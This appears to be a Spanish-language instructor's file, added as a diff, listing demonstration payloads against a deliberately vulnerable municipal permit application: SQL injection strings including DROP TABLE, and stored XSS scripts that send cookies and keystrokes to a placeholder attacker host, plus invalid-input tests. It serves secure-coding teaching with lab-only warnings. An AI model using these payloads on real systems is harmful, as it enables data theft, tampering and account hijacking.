@@ -1,0 +1,310 @@
+===============================================================================
+PAYLOADS DE ATAQUE PARA DEMOSTRACIÓN
+Sistema de Permisos de Construcción - Su Municipalidad
+Semana 3: Validación de Datos y Prevención de Inyecciones
+===============================================================================
+
+INTRODUCCIÓN
+------------
+
+Este documento contiene una colección completa de payloads de ataque que el docente puede utilizar durante la demostración del caso práctico vulnerable. Los payloads están organizados por tipo de vulnerabilidad y incluyen explicaciones detalladas sobre cómo funcionan y qué impacto tienen en el sistema.
+
+El objetivo pedagógico es demostrar de manera práctica y visual las consecuencias reales de no implementar validación y sanitización apropiadas, fortaleciendo la comprensión de los estudiantes sobre la importancia de las medidas de seguridad.
+
+IMPORTANTE: Estos payloads deben utilizarse exclusivamente en el ambiente de demostración controlado con el controlador vulnerable. Nunca deben ser probados en sistemas de producción o aplicaciones reales.
+
+
+===============================================================================
+SECCIÓN 1: PAYLOADS PARA SQL INJECTION
+===============================================================================
+
+Los siguientes payloads deben ingresarse en el campo de búsqueda por cédula del formulario de búsqueda avanzada cuando se esté utilizando el controlador vulnerable.
+
+
+PAYLOAD 1: SQL INJECTION BÁSICO - BYPASS DE AUTENTICACIÓN
+----------------------------------------------------------
+
+Payload a ingresar:
+' OR '1'='1' --
+
+Descripción del ataque:
+Este es el payload clásico de SQL Injection que cierra la cadena de la consulta original y agrega una condición siempre verdadera. Los dos guiones finales comentan el resto de la consulta SQL original.
+
+Consulta SQL vulnerable resultante:
+SELECT * FROM SolicitudesPermisos WHERE CedulaPropietario = '' OR '1'='1' --'
+
+Impacto demostrable:
+El sistema retornará TODAS las solicitudes en la base de datos en lugar de solo las solicitudes del propietario con la cédula buscada. Esto demuestra cómo un atacante puede acceder a información que no le corresponde.
+
+Punto pedagógico:
+Explicar a los estudiantes cómo el apóstrofe cierra la cadena, el OR '1'='1' hace que la condición siempre sea verdadera, y los guiones dobles comentan el resto de la consulta para evitar errores de sintaxis.
+
+
+PAYLOAD 2: SQL INJECTION - ENUMERACIÓN DE BASE DE DATOS
+--------------------------------------------------------
+
+Payload a ingresar:
+' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --
+
+Descripción del ataque:
+Este payload intenta usar UNION para combinar los resultados de la consulta legítima con una consulta maliciosa. El número de NULL debe coincidir con el número de columnas en la tabla SolicitudesPermisos.
+
+Consulta SQL vulnerable resultante:
+SELECT * FROM SolicitudesPermisos WHERE CedulaPropietario = '' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --'
+
+Impacto demostrable:
+Si el número de columnas es correcto, el atacante puede empezar a enumerar la estructura de la base de datos. Si es incorrecto, recibirá un error que le dará información sobre la cantidad de columnas.
+
+Punto pedagógico:
+Este ataque demuestra cómo los atacantes pueden usar técnicas de enumeración para descubrir la estructura de la base de datos y potencialmente extraer información de otras tablas.
+
+
+PAYLOAD 3: SQL INJECTION - EXTRACCIÓN DE INFORMACIÓN DE SISTEMA
+----------------------------------------------------------------
+
+Payload a ingresar:
+' UNION SELECT @@version, USER_NAME(), DB_NAME(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --
+
+Descripción del ataque:
+Este payload utiliza funciones del sistema de SQL Server para extraer información sobre la versión de la base de datos, el usuario actual, y el nombre de la base de datos.
+
+Impacto demostrable:
+Un atacante puede obtener información crítica del sistema que le permitirá planear ataques más sofisticados o identificar vulnerabilidades específicas de la versión del motor de base de datos en uso.
+
+Punto pedagógico:
+Demostrar cómo la inyección SQL puede ir más allá de simplemente acceder a datos de la aplicación y comprometer información del sistema completo.
+
+
+PAYLOAD 4: SQL INJECTION - MODIFICACIÓN DE DATOS
+-------------------------------------------------
+
+Payload a ingresar:
+123456789'; UPDATE SolicitudesPermisos SET Estado = 'Aprobada' WHERE Id = 1; --
+
+Descripción del ataque:
+Este payload intenta no solo leer datos sino modificarlos activamente. En este caso, cambiaría el estado de una solicitud a "Aprobada" sin autorización.
+
+Consulta SQL vulnerable resultante:
+SELECT * FROM SolicitudesPermisos WHERE CedulaPropietario = '123456789'; UPDATE SolicitudesPermisos SET Estado = 'Aprobada' WHERE Id = 1; --'
+
+Impacto demostrable:
+Si el sistema permite múltiples sentencias SQL, este ataque podría aprobar automáticamente solicitudes sin el debido proceso de revisión. Esto demuestra el potencial destructivo de SQL Injection.
+
+Punto pedagógico:
+Explicar que SQL Injection no solo permite leer datos sino también modificarlos o eliminarlos, lo cual puede tener consecuencias graves en la integridad de los datos del sistema.
+
+
+PAYLOAD 5: SQL INJECTION - ELIMINACIÓN DE DATOS
+------------------------------------------------
+
+Payload a ingresar:
+'; DROP TABLE SolicitudesPermisos; --
+
+Descripción del ataque:
+Este es el infame payload de eliminación de tablas que puede destruir completamente datos críticos del sistema.
+
+Consulta SQL vulnerable resultante:
+SELECT * FROM SolicitudesPermisos WHERE CedulaPropietario = ''; DROP TABLE SolicitudesPermisos; --'
+
+Impacto demostrable:
+ADVERTENCIA: No ejecutar este payload en la demostración real a menos que tenga un backup reciente. Este ataque eliminaría permanentemente la tabla completa de solicitudes. Es preferible solo explicarlo teóricamente.
+
+Punto pedagógico:
+Este es el escenario más dramático de SQL Injection que demuestra cómo un atacante malicioso podría destruir completamente los datos de una aplicación, causando pérdida irreparable de información y parálisis operativa.
+
+
+===============================================================================
+SECCIÓN 2: PAYLOADS PARA CROSS-SITE SCRIPTING (XSS)
+===============================================================================
+
+Los siguientes payloads deben ingresarse en el campo de comentario o descripción del proyecto cuando se esté utilizando la versión vulnerable del sistema que no sanitiza las entradas.
+
+
+PAYLOAD 1: XSS BÁSICO - ALERTA JAVASCRIPT
+------------------------------------------
+
+Payload a ingresar en campo de comentario:
+<script>alert('Ataque XSS ejecutado exitosamente');</script>
+
+Descripción del ataque:
+Este es el payload más básico de XSS que simplemente ejecuta una alerta de JavaScript en el navegador del usuario que visualiza el comentario.
+
+Impacto demostrable:
+Cuando un funcionario municipal abra la solicitud para revisarla, verá una alerta emergente. Aunque este ejemplo es inofensivo, demuestra que código JavaScript arbitrario puede ejecutarse en el navegador del usuario.
+
+Punto pedagógico:
+Explicar que si un atacante puede ejecutar una simple alerta, también puede ejecutar código más peligroso como el robo de cookies de sesión o la modificación del contenido de la página.
+
+
+PAYLOAD 2: XSS - ROBO DE COOKIES DE SESIÓN
+-------------------------------------------
+
+Payload a ingresar en campo de comentario:
+<script>
+fetch('http://sitio-atacante.com/robar?cookie=' + document.cookie);
+alert('Sus credenciales han sido comprometidas');
+</script>
+
+Descripción del ataque:
+Este payload intenta enviar las cookies del navegador del usuario a un servidor controlado por el atacante. Las cookies frecuentemente contienen tokens de sesión que permiten acceso autenticado.
+
+Impacto demostrable:
+Cuando un funcionario autenticado visualiza este comentario, sus cookies de sesión serían enviadas al atacante, quien podría usarlas para suplantar su identidad en el sistema.
+
+Punto pedagógico:
+Este ejemplo demuestra el impacto real del XSS: no solo es molesto sino que puede comprometer completamente la seguridad de las cuentas de usuario al robar sus credenciales de sesión.
+
+
+PAYLOAD 3: XSS - MODIFICACIÓN DE CONTENIDO DE LA PÁGINA
+--------------------------------------------------------
+
+Payload a ingresar en campo de comentario:
+<script>
+document.querySelector('.card-header').innerHTML = '<h1 style="color:red;">SISTEMA COMPROMETIDO</h1>';
+document.querySelector('.card-body').innerHTML = '<h2>Este sistema ha sido hackeado. Todos los datos han sido cifrados.</h2>';
+</script>
+
+Descripción del ataque:
+Este payload modifica el contenido HTML de la página para mostrar un mensaje alarmante, simulando un ataque de defacement (desfiguración del sitio).
+
+Impacto demostrable:
+La página de detalles de la solicitud mostraría mensajes falsos de compromiso del sistema, lo cual podría causar pánico entre los funcionarios y deteriorar la confianza en el sistema.
+
+Punto pedagógico:
+Demostrar que XSS permite modificar arbitrariamente lo que los usuarios ven en sus pantallas, lo cual puede usarse para phishing, desinformación, o simplemente dañar la reputación de la institución.
+
+
+PAYLOAD 4: XSS - REDIRECCIÓN A SITIO MALICIOSO
+-----------------------------------------------
+
+Payload a ingresar en campo de comentario:
+<script>
+window.location.href = 'http://sitio-phishing.com/login-municipal-falso.html';
+</script>
+
+Descripción del ataque:
+Este payload redirige automáticamente al usuario a un sitio web externo controlado por el atacante, típicamente una página de phishing que imita el login del sistema real.
+
+Impacto demostrable:
+Cuando un funcionario visualiza el comentario, su navegador será redirigido a otro sitio. Si ese sitio simula la página de login municipal, el funcionario podría ingresar sus credenciales sin darse cuenta de que está en un sitio falso.
+
+Punto pedagógico:
+Explicar cómo el XSS puede combinarse con técnicas de ingeniería social para crear ataques de phishing muy efectivos que aprovechan la confianza de los usuarios en el sistema legítimo.
+
+
+PAYLOAD 5: XSS - KEYLOGGER EN JAVASCRIPT
+-----------------------------------------
+
+Payload a ingresar en campo de comentario:
+<script>
+document.addEventListener('keypress', function(e) {
+    fetch('http://sitio-atacante.com/log?key=' + e.key);
+});
+</script>
+
+Descripción del ataque:
+Este payload instala un keylogger en JavaScript que captura todas las teclas presionadas por el usuario mientras está en la página y las envía a un servidor del atacante.
+
+Impacto demostrable:
+Cualquier información que el funcionario escriba en la página mientras esté visualizando esta solicitud sería capturada y enviada al atacante, incluyendo potencialmente información sensible o credenciales.
+
+Punto pedagógico:
+Este es uno de los ataques más sofisticados de XSS que demuestra cómo puede usarse para espionaje continuo y captura de información confidencial sin que el usuario lo note.
+
+
+PAYLOAD 6: XSS CON ETIQUETAS NO OBVIAS
+---------------------------------------
+
+Payload a ingresar en campo de comentario:
+<img src="x" onerror="alert('XSS mediante imagen')">
+
+Descripción del ataque:
+Este payload demuestra que XSS no solo se logra con etiquetas script. Aquí se usa una etiqueta img con un evento onerror que se dispara cuando la imagen no carga.
+
+Impacto demostrable:
+Demuestra que los filtros que solo bloquean la etiqueta script son insuficientes, ya que hay múltiples vectores para ejecutar JavaScript en HTML.
+
+Punto pedagógico:
+Enfatizar que una protección efectiva contra XSS requiere encoding completo de todos los caracteres HTML especiales, no solo filtrar palabras clave como "script".
+
+
+===============================================================================
+SECCIÓN 3: PAYLOADS PARA PROBAR VALIDACIÓN DEL LADO SERVIDOR
+===============================================================================
+
+Estos datos inválidos deben ser ingresados después de deshabilitar la validación del lado cliente usando las herramientas de desarrollador del navegador.
+
+
+DATOS INVÁLIDOS PARA CAMPO CÉDULA
+----------------------------------
+
+Prueba 1: Cédula con letras
+Valor a ingresar: ABC123DEF
+Resultado esperado en versión vulnerable: Se acepta y guarda sin validación
+Resultado esperado en versión segura: Rechazado con mensaje "La cédula debe tener 9 dígitos"
+
+Prueba 2: Cédula con longitud incorrecta
+Valor a ingresar: 12345
+Resultado esperado en versión vulnerable: Se acepta y guarda
+Resultado esperado en versión segura: Rechazado por no cumplir el formato requerido
+
+
+DATOS INVÁLIDOS PARA CAMPO EMAIL
+---------------------------------
+
+Prueba 1: Email sin formato válido
+Valor a ingresar: esto-no-es-un-email
+Resultado esperado en versión vulnerable: Se acepta y guarda
+Resultado esperado en versión segura: Rechazado con mensaje "Debe proporcionar un correo electrónico válido"
+
+Prueba 2: Email vacío
+Valor a ingresar: (campo vacío)
+Resultado esperado en versión vulnerable: Se acepta con valor null
+Resultado esperado en versión segura: Rechazado con mensaje "El correo electrónico es obligatorio"
+
+
+DATOS INVÁLIDOS PARA CAMPOS NUMÉRICOS
+--------------------------------------
+
+Prueba 1: Área de construcción negativa
+Valor a ingresar: -50
+Resultado esperado en versión vulnerable: Se acepta y guarda
+Resultado esperado en versión segura: Rechazado con mensaje "El área debe estar entre 1 m² y 5,000 m²"
+
+Prueba 2: Presupuesto fuera de rango
+Valor a ingresar: 999999999999
+Resultado esperado en versión vulnerable: Se acepta (o falla con error de base de datos)
+Resultado esperado en versión segura: Rechazado con mensaje de rango apropiado
+
+
+===============================================================================
+SECCIÓN 4: GUÍA DE USO DURANTE LA DEMOSTRACIÓN
+===============================================================================
+
+ORDEN RECOMENDADO DE DEMOSTRACIÓN
+----------------------------------
+
+La demostración debe seguir este flujo lógico para maximizar el impacto pedagógico:
+
+Primero, demostrar la falta de validación del lado servidor. Usar las herramientas de desarrollador del navegador para eliminar el atributo "required" de los campos del formulario. Intentar enviar datos claramente inválidos como cédulas con letras o emails con formato incorrecto. Mostrar que el sistema vulnerable acepta estos datos sin cuestionamiento, mientras que el sistema seguro los rechaza apropiadamente.
+
+Segundo, demostrar SQL Injection con impacto gradualmente creciente. Comenzar con el payload básico que retorna todas las solicitudes para demostrar bypass de autenticación. Luego usar el payload de extracción de información del sistema para mostrar cómo se puede obtener metadata. Si el tiempo lo permite, explicar teóricamente los payloads de modificación y eliminación sin ejecutarlos realmente.
+
+Tercero, demostrar XSS almacenado de forma progresiva. Comenzar con el payload de alerta simple que es inofensivo pero demostrativo. Luego mostrar el payload de modificación de contenido que tiene impacto visual dramático. Finalmente, explicar teóricamente los payloads de robo de cookies y keylogger sin ejecutarlos en un ambiente real por razones de seguridad.
+
+Cuarto, mostrar las correcciones implementadas. Ejecutar los mismos payloads contra el controlador seguro y demostrar que todos fallan apropiadamente. Explicar línea por línea el código que implementa las protecciones.
+
+
+CONSIDERACIONES DE SEGURIDAD DURANTE LA DEMOSTRACIÓN
+-----------------------------------------------------
+
+Es fundamental mantener un ambiente controlado durante toda la demostración. Todos los payloads deben ejecutarse únicamente en el ambiente de desarrollo local con base de datos de prueba. Nunca demostrar estos ataques en sistemas conectados a redes de producción o con datos reales de ciudadanos.
+
+Los payloads que involucran envío de datos a servidores externos (como los de robo de cookies) deben ejecutarse solo en ambientes completamente aislados o, preferiblemente, solo explicarse teóricamente sin ejecución real.
+
+Después de cada demostración de vulnerabilidad, enfatizar inmediatamente la corrección correspondiente para evitar que los estudiantes se lleven solo la impresión del ataque sin comprender la defensa.
+
+
+===============================================================================
+FIN DEL DOCUMENTO DE PAYLOADS DE ATAQUE
+===============================================================================
